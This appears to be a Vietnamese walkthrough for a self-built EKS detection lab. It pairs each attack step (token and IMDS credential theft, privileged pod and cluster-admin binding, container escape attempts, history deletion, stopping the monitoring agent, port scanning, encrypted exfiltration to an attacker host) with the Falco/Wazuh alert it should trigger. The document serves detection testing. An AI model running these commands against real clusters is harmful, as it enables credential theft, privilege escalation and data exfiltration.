# Hướng dẫn chạy các attack scenario

Tài liệu này hướng dẫn chạy từng bước tấn công trong lab CipherGuard. Với mỗi bước, bạn sẽ biết:

- lệnh để thực hiện;
- alert nào phải xuất hiện trong Wazuh;
- ở lượt prevent thì cluster chặn được những gì.

Danh mục scenario và cách map MITRE nằm ở [attack-scenarios.md](attack-scenarios.md).

> **Chỉ chạy trong lab của bạn.** Mọi lệnh dưới đây giả định bạn đang ở trong VPC lab vừa tạo bằng `make up`, dùng dữ liệu giả, và egress chỉ được phép đi tới attacker host. Không chạy các lệnh này nhắm vào cluster hay tài khoản AWS nào khác.

## Trạng thái

| Phần | Trạng thái |
|---|---|
| Rule Falco, rule Wazuh, policy Kyverno | Đã viết. Đã kiểm chứng offline: `scripts/scan.sh detection` pass 26/26 case, `scripts/scan.sh policies` pass 10/10 |
| Chạy trên EKS thật | Chưa. Cần `make up`, `make deploy` rồi đo trên lab |
| Bước 4 (exfiltration) | Script `attack/exfil.py` (AES-256-GCM + RSA) và volume `/data` đã có. Logic mã hóa và guard đã test offline |
| Chạy tự động cả chuỗi tấn công | `attack/run-attack.sh` chạy các bước 1–4, D, B, G qua `kubectl exec`, ghi timestamp |
| Phản hồi tự động | Wazuh Active Response `cipherguard-isolate.sh` cô lập container của pod, chỉ bật ở lượt prevent |

## 1. Chuẩn bị

```bash
make up                      # tạo lab, mất khoảng 15-20 phút
make deploy-detect           # lượt detect-only: policy để Audit, egress mở
# hoặc
make deploy                  # lượt prevent: policy để Enforce, network default-deny
```

`make deploy*` cài Kyverno, các policy, Falco và demo app. Nó cũng đẩy rule lên Wazuh manager (lệnh này tự chờ nếu Wazuh đang cài dở), rồi chạy smoke test. Ở lượt prevent, `make deploy` còn bật Active Response.

Nếu muốn chạy bước exfiltration với mã hóa thật, chuẩn bị trước thư viện `cryptography` cho pod (image demo đã gỡ pip):

```bash
attack/vendor-deps.sh         # tải wheel cryptography vào attack/vendor/ (chạy một lần)
```

Mở dashboard Wazuh:

```bash
terraform -chdir=infra/terraform output -raw wazuh_admin_password_command | bash
terraform -chdir=infra/terraform output -raw wazuh_dashboard_tunnel | bash
# mở https://localhost:8443, đăng nhập bằng user admin
```

Trong dashboard, vào **Threat Hunting → Events** và lọc bằng `rule.groups: cipherguard`. Mỗi bước có group riêng, ví dụ `cipherguard_step1` hay `cipherguard_scenario_d`, nên bạn có thể lọc theo từng bước.

### Chạy nhanh cả chuỗi

Thay vì gõ từng lệnh, bạn có thể chạy toàn bộ chuỗi và để script ghi timestamp từng bước:

```bash
make attack-detect           # lượt detect-only: kỳ vọng có alert, dữ liệu tới attacker
make attack                  # lượt prevent: kỳ vọng bị chặn, pod có thể bị cô lập
```

Phần dưới đây mô tả từng bước thủ công, để bạn hiểu mỗi lệnh map rule nào.

### Làm thủ công

Lấy tên pod và vào shell của nó (đây là bước 1, tức foothold):

```bash
POD=$(kubectl -n demo get pod -l app.kubernetes.io/name=demo-app -o jsonpath='{.items[0].metadata.name}')
kubectl -n demo exec -it "$POD" -- sh
```

Image demo là `python:3.13-slim` chạy non-root với root filesystem read-only. Trong pod không có `curl` hay `nmap`, nên các lệnh mạng bên dưới đều dùng Python. Chỉ `/tmp` là ghi được.

## 2. Hai lượt chạy

| | Detect-only (`make deploy-detect`) | Prevent (`make deploy`) |
|---|---|---|
| Kyverno | Audit: request vẫn được cho qua, vi phạm ghi vào PolicyReport | Enforce: request bị từ chối |
| NetworkPolicy | Egress mở | Default-deny, chỉ cho DNS và 443 ra ngoài VPC |
| Kết quả mong đợi | Wazuh có alert cho các bước 1 đến 4 | Chuỗi tấn công dừng ở bước 3 hoặc 4, alert vẫn xuất hiện |

Với mỗi bước, ghi lại thời điểm bạn chạy lệnh và thời điểm alert hiện ra. Phase 7 sẽ dùng số liệu này để kiểm tra mục tiêu alert trong 60 giây.

## 3. Các bước

Cột **Alert** ghi ID rule Wazuh và level. Rule nằm trong [detection/wazuh/rules/](../detection/wazuh/rules/), rule Falco nằm trong [detection/falco/cipherguard_rules.yaml](../detection/falco/cipherguard_rules.yaml).

### Bước 0: Deploy image chưa ký

Chạy từ máy của bạn, không phải trong pod:

```bash
kubectl -n demo run evil --image=nginxinc/nginx-unprivileged:1.27 --restart=Never \
  --overrides='{"spec":{"securityContext":{"runAsNonRoot":true,"runAsUser":101,"seccompProfile":{"type":"RuntimeDefault"}},"containers":[{"name":"evil","image":"nginxinc/nginx-unprivileged:1.27","securityContext":{"allowPrivilegeEscalation":false,"capabilities":{"drop":["ALL"]}}}]}}'
```

Pod spec này đã thỏa PSS restricted, nên chỉ có policy registry hoặc policy chữ ký mới có thể chặn nó.

| Lượt | Kết quả |
|---|---|
| Prevent | Bị từ chối với thông báo `restrict-image-registries`. Wazuh **100201** (level 10, T1610) |
| Detect-only | Pod được tạo, vi phạm ghi vào PolicyReport: `kubectl get policyreport -n demo` |

Ở phía pipeline, `make negative` chứng minh Trivy, hadolint và Checkov đều chặn image có lỗ hổng hoặc chạy root ngay trước khi build.

### Bước 1: Foothold (T1609)

Chính lệnh `kubectl exec ... -- sh` ở phần chuẩn bị là bước này.

| Nguồn | Alert |
|---|---|
| Falco "Terminal shell in container" | **100110** (level 10) |
| EKS audit, subresource `exec` | **100202** (level 8) |

Ở lượt prevent, chỉ admin mới exec được. Role `demo-viewer` của developer không có quyền `exec`.

### Bước 2: Discovery (T1552.007, T1613)

Trong pod:

```sh
# Kubernetes API token: phải KHÔNG có (automountServiceAccountToken: false)
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1

# IRSA token: có (để app gọi STS), đọc nó là hành vi đáng ngờ
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token | head -c 40; echo
env | grep -i aws

# Thử gọi Kubernetes API mà không có token
python -c "import ssl,urllib.request as u; c=ssl._create_unverified_context(); print(u.urlopen('https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets', context=c).status)"
```

| Hành vi | Alert |
|---|---|
| Đọc token | Falco 100112 (level 10) |
| Kết nối tới API server | Falco 100111 (level 8) |
| API trả 403 cho `system:anonymous` | EKS audit **100203** (level 8) |

Ở lượt prevent, ở đây không có token Kubernetes để lấy cắp.

### Scenario D: Lấy credential từ IMDS (T1552.005)

```sh
python - <<'PY'
import urllib.request as u
try:
    r = u.Request("http://169.254.169.254/latest/api/token", method="PUT",
                  headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"})
    print(u.urlopen(r, timeout=3).read()[:20])
except Exception as e:
    print("blocked:", type(e).__name__)
PY
```

| Lượt | Kết quả |
|---|---|
| Cả hai | Falco **100113** (level 12) xuất hiện ngay cả khi kết nối bị chặn, vì Falco bắt được lời gọi `connect` |
| Prevent | Timeout, do NetworkPolicy chặn `169.254.169.254` |
| Detect-only | Vẫn thất bại, vì IMDSv2 đặt hop limit 1: response không về được tới pod |

Rule CloudTrail **100301** báo khi credential của node role bị dùng từ một IP không phải NAT. Trong lab, credential không lấy được, nên rule này là lớp phòng thủ dự phòng.

### Bước 3: Escalation (T1611, T1098, T1078.004)

**3a. Dùng quyền AWS của pod** (từ trong pod, boto3 có sẵn trong image):

```sh
python -c "import boto3; boto3.client('s3').list_buckets()" 2>&1 | tail -1
python -c "import boto3; boto3.client('iam').list_users()" 2>&1 | tail -1
```

Kết quả: `AccessDenied`, vì IRSA role chỉ được đọc `/cipherguard/demo-app/*` trong SSM. Wazuh báo **100300** (level 10) qua CloudTrail. CloudTrail đẩy log vào S3 chậm khoảng 5–15 phút, nên alert này không tính vào mục tiêu 60 giây.

**3b. Tạo pod privileged và gán cluster-admin.** Chạy từ máy của bạn, giả định kẻ tấn công đã có credential đủ quyền:

```bash
kubectl -n default run priv --image=busybox:1.36 --restart=Never \
  --overrides='{"spec":{"containers":[{"name":"priv","image":"busybox:1.36","command":["sleep","300"],"securityContext":{"privileged":true}}]}}'

kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=demo:demo-app
```

| Lượt | Kết quả |
|---|---|
| Prevent | Cả hai lệnh bị Kyverno từ chối, do `pod-security-baseline` và `deny-cluster-admin-to-serviceaccounts`. Wazuh báo **100201** |
| Detect-only | Cả hai lệnh thành công. Wazuh báo **100205** (level 12) và **100206** (level 12), nếu audit log ghi lại request body |

Dọn dẹp sau lượt detect-only:

```bash
kubectl -n default delete pod priv
kubectl delete clusterrolebinding pwn
```

### Scenario B: Container escape (T1611)

Trong pod, nếu image có công cụ tương ứng:

```sh
nsenter -t 1 -m sh 2>&1 | head -1          # Falco 100114
python -c "import socket; s=socket.socket(socket.AF_UNIX); s.connect('/run/containerd/containerd.sock')" 2>&1 | tail -1
```

Pod demo không mount hostPath và không có `hostPID`, nên các lệnh này đều thất bại. Falco vẫn báo **100114** (level 12) cho lệnh `nsenter`. Lỗi phía admission (pod có hostPath hoặc hostPID) đã được kiểm tra trong smoke test.

### Scenario G: Defense evasion (T1105, T1070, T1562.001)

Trong pod:

```sh
cp /bin/ls /tmp/x && /tmp/x / >/dev/null    # chạy binary vừa thả vào /tmp: Falco 100115
touch /tmp/.sh_history && rm -f /tmp/.sh_history   # xóa history: Falco 100116
```

Trên node, mở bằng SSM. Chỉ làm khi bạn chủ động muốn kiểm tra cảnh báo agent mất kết nối:

```bash
NODE=$(aws ec2 describe-instances --filters "Name=tag:eks:cluster-name,Values=cipherguard-eks" \
  "Name=instance-state-name,Values=running" --query 'Reservations[0].Instances[0].InstanceId' --output text)
aws ssm start-session --target "$NODE"
sudo systemctl stop wazuh-agent      # Falco 100117 và Wazuh 100140 (agent disconnected)
sudo systemctl start wazuh-agent
```

Khi agent bị dừng, event Falco 100117 có thể không được gửi đi, vì agent đã tắt. Tín hiệu đáng tin cậy là **100140**, do manager tự phát hiện agent mất kết nối.

### Scenario F: Recon / lateral movement (T1046)

```sh
python - <<'PY'
import socket
for port in (22, 1514, 8080):
    s = socket.socket(); s.settimeout(1)
    print(port, s.connect_ex(("10.20.0.10", port))); s.close()
PY
```

Trong pod không có `nmap`. Quét bằng Python sẽ kích hoạt rule **100120** (kết nối outbound bất thường, cổng khác 53 và 443). Nếu dùng công cụ có tên như `nmap` hay `nc`, Falco sẽ báo **100118**. Ở lượt prevent, NetworkPolicy chặn mọi kết nối này.

### Bước 4: Exfiltration (T1005, T1041)

Dữ liệu giả được mount sẵn tại `/data` (ConfigMap `demo-app-testdata`, bật bằng `testData.enabled`). Script [attack/exfil.py](../attack/exfil.py) đọc `/data`, mã hóa body bằng AES-256-GCM, bọc key AES bằng RSA-OAEP (public key lab trong `attack/keys/`), rồi POST lên attacker host. `run-attack.sh` lo việc thả script và thư viện `cryptography` vào `/tmp` của pod rồi chạy nó. Script có ba guard: cần `CIPHERGUARD_LAB=1`, target phải là IP nội bộ VPC, và chỉ đọc thư mục dữ liệu giả.

Chạy thủ công bên trong pod (sau khi `run-attack.sh` đã thả file):

```sh
CIPHERGUARD_LAB=1 PYTHONPATH=/tmp/pydeps python /tmp/exfil.py \
  --host <attacker_ip> --port 8080 --pubkey /tmp/keys/lab_recipient_pub.pem
```

| Hành vi | Alert |
|---|---|
| Đọc `/data/...` | Falco **100119** (level 8) |
| Kết nối ra `attacker:8080` | Falco **100120** (level 10) |
| Hai event trên cùng một container trong vòng 2 phút | Rule tương quan **100130** (level 14) |

Nội dung đã bị mã hóa nên không thể kiểm tra được. Phát hiện ở bước này hoàn toàn dựa vào hành vi.

| Lượt | Kết quả |
|---|---|
| Detect-only | Attacker host nhận được blob mã hóa: xem `/var/lib/receiver/` qua `aws ssm start-session` |
| Prevent | NetworkPolicy chặn cổng 8080, nhưng alert 100119 và 100120 vẫn xuất hiện. Active Response (rule 100130) cô lập container của pod |

### Phản hồi tự động (Active Response)

Ở lượt prevent, Wazuh manager chạy [cipherguard-isolate.sh](../detection/wazuh/active-response/cipherguard-isolate.sh) trên node khi một trong các rule 100113, 100114, 100117 hoặc 100130 fire. Script dùng `crictl` để dừng đúng container của pod bị tấn công, không đụng tới node, nên node vẫn kết nối Wazuh.

```bash
# Sau lượt prevent, container của pod có thể đã bị restart:
kubectl -n demo get pod "$POD" -o jsonpath='{.status.containerStatuses[0].restartCount}'; echo
# Log phản hồi trên node:
aws ssm start-session --target <node-id>
sudo tail /var/ossec/logs/active-responses.log
```

Ở lượt detect-only, Active Response **không** bật, để không cắt ngang việc thu thập alert.

## 4. Bảng tra rule

| ID | Level | MITRE | Nguồn | Ý nghĩa |
|---|---|---|---|---|
| 100110 | 10 | T1609 | Falco | Shell trong container |
| 100111 | 8 | T1613 | Falco | Container gọi Kubernetes API |
| 100112 | 10 | T1552.007 | Falco | Đọc token ServiceAccount hoặc IRSA |
| 100113 | 12 | T1552.005 | Falco | Container gọi IMDS |
| 100114 | 12 | T1611 | Falco | Công cụ escape hoặc truy cập socket runtime |
| 100115 | 10 | T1105 | Falco | Chạy binary từ `/tmp` |
| 100116 | 10 | T1070 | Falco | Xóa log hoặc history |
| 100117 | 13 | T1562.001 | Falco | Dừng Falco hoặc Wazuh |
| 100118 | 8 | T1046 | Falco | Công cụ quét mạng |
| 100119 | 8 | T1005 | Falco | Đọc dữ liệu giả |
| 100120 | 10 | T1041 | Falco | Outbound bất thường từ pod app |
| 100130 | 14 | T1041 | Tương quan | Đọc dữ liệu rồi gửi ra ngoài, cùng một container |
| 100140 | 10 | T1562.001 | Wazuh | Agent mất kết nối |
| 100201 | 10 | T1610 | EKS audit | Admission bị từ chối |
| 100202 | 8 | T1609 | EKS audit | `kubectl exec` |
| 100203 | 8 | T1613 | EKS audit | 403 từ workload hoặc anonymous |
| 100204 | 9 | T1552.007 | EKS audit | List secrets thành công bởi một identity không phải hệ thống |
| 100205 | 12 | T1611 | EKS audit | Yêu cầu tạo pod privileged hoặc dùng host |
| 100206 | 12 | T1098 | EKS audit | Tạo hoặc sửa binding cluster-admin |
| 100207 | 10 | T1053.007 | EKS audit | Tạo CronJob hoặc DaemonSet |
| 100300 | 10 | T1078.004 | CloudTrail | IAM role của pod bị từ chối |
| 100301 | 12 | T1552.005 | CloudTrail | Credential của node role dùng từ IP lạ |

## 5. Độ trễ cần biết

| Nguồn | Độ trễ thường gặp |
|---|---|
| Falco → file → Wazuh agent | Vài giây |
| EKS audit → CloudWatch → Wazuh (poll mỗi 30 giây) | Khoảng 30–90 giây, sẽ đo ở Phase 7 |
| CloudTrail → S3 → Wazuh | 5–15 phút, chỉ là bằng chứng bổ sung |

## 6. Dọn dẹp

```bash
kubectl -n demo delete pod evil --ignore-not-found
make down          # xóa toàn bộ lab và liệt kê resource còn sót
```
